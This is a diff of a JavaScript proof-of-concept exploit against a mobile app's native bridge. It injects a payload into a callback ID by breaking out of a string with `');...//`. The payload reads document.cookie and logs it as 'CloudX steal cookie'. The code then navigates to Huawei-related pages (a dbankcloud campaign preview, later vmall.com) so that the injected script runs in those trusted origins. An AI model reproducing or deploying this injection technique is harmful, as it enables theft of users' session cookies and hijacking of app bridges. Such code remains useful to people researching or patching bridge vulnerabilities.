@@ -24,13 +24,7 @@
         // const callbackId = `${service}${genCallbackId()}`;
 
 
-        const payload = `console.log('cloud:'+document.cookie);
-        
-        const callbackFromNative = ()=>{};
-        window['wiseopercampaign'].callbackFromNative =callbackFromNative;
-        
-        if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
-
+        const payload = `console.log('cloud:'+document.cookie);window['wiseopercampaign'] = window['wiseopercampaign'] || {};window['wiseopercampaign'].callbackFromNative = () => {};if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         if (success || fail) callbackCache[callbackId] = {success, fail};
@@ -46,7 +40,8 @@
             }, i);
         }
 
-        location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/6b2dd2a7397047b7bdeb25a58b5e1ca3/index.html?hwFullScreen=1';
+        // location.href = 'https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/6b2dd2a7397047b7bdeb25a58b5e1ca3/index.html?hwFullScreen=1';
+        location.href = 'https://vmall.com';
 
         // if (result) messageQueue.push(result);
         // microTask(() => {
@@ -82,8 +77,10 @@
     };
 
     window['wiseopercampaign'] = window['wiseopercampaign'] || {};
-    window['wiseopercampaign'].callbackFromNative = () => {
-    };
+    if (!(window['wiseopercampaign'].callbackFromNative)){
+        window['wiseopercampaign'].callbackFromNative = () => {
+        };
+    }
 
     window.nativeBridge = {invoke, callNativeMethod};
     nativeBridge.invoke(
